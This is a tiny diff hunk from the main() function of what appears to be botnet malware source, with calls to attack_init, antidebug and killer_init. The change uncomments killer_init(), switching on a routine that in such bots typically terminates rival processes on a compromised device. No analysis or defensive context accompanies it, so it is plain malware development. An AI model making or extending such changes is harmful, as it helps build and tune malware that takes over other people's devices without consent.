@@ -156,7 +156,7 @@ int main(int argc, char **args)
     #endif
     flush();
     attack_init();
-    //killer_init();
+    killer_init();
     antidebug();
 
     chdir("/");
